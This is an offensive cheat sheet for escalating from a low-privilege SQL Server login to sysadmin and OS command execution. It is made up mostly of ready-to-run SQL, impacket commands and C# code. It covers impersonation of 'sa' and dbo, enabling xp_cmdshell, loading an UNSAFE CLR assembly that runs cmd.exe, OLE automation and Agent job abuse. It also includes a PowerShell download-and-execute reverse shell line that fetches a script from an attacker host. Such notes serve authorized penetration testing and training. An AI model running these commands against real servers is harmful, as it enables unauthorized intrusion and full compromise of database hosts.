---
tags:
  - Exploitation
  - Foundational
  - Privilege_Escalation
  - SQL
  - Windows
---

## SQL Server Privilege Escalation
resources: [PowerUpSQL Wiki](https://github.com/NetSPI/PowerUpSQL/wiki)

> [!info] Escalate from low-privilege SQL user to sysadmin or OS command execution.

### Check Current Privileges [Remote]
```sql
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT IS_SRVROLEMEMBER('public')
SELECT SYSTEM_USER
SELECT USER_NAME()
```

### Impersonation Attack
> [!tip] If **IMPERSONATE** permission exists, can execute as higher-privileged user.

```sql
-- Check for impersonation privileges
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'

-- Execute as another user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
REVERT
```

### Database Owner Impersonation
> [!tip] **db_owner** can execute as **dbo** in trustworthy databases.

```sql
-- Find trustworthy databases
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1

-- Execute as dbo
USE <TrustworthyDB>
EXECUTE AS USER = 'dbo'
SELECT SYSTEM_USER
```

## Getting Code Execution

### Enable xp_cmdshell [Remote]
```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1
RECONFIGURE

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

### Execute Commands [Remote]
```sql
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'hostname'
EXEC xp_cmdshell 'ipconfig'
```

### Reverse Shell via xp_cmdshell [Remote]
```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<AttackerIP>/shell.ps1'')"'
```

### Via Impacket [Local]
```bash
impacket-mssqlclient sa:<Password>@<Target>
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## Custom Assemblies (CLR)

> [!tip] Load custom .NET assemblies for code execution. Bypasses some security controls.

### Enable CLR [Remote]
```sql
EXEC sp_configure 'clr enabled', 1
RECONFIGURE

-- For untrusted assemblies
ALTER DATABASE master SET TRUSTWORTHY ON
```

### Create Assembly from Hex [Remote]
```sql
CREATE ASSEMBLY myAssembly
FROM 0x4D5A90... -- Hex-encoded DLL
WITH PERMISSION_SET = UNSAFE
```

### Create Procedure from Assembly [Remote]
```sql
CREATE PROCEDURE [dbo].[cmdExec]
@cmd NVARCHAR(4000)
AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]
```

### Execute Custom Procedure [Remote]
```sql
EXEC cmdExec 'whoami'
```

### Generate CLR Assembly [Local]
```csharp
using System;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString cmd)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@"/C {0}", cmd);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
    }
}
```

## Ole Automation Procedures [alternative]

```sql
-- Enable Ole Automation
EXEC sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

-- Execute command
DECLARE @shell INT
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT
EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami > C:\output.txt'
```

## Agent Jobs [alternative]

```sql
-- Create job that executes command
USE msdb
EXEC sp_add_job @job_name = 'ExecuteCmd'
EXEC sp_add_jobstep @job_name = 'ExecuteCmd', @step_name = 'RunCmd', @subsystem = 'CmdExec', @command = 'whoami > C:\output.txt'
EXEC sp_add_jobserver @job_name = 'ExecuteCmd'
EXEC sp_start_job @job_name = 'ExecuteCmd'
```
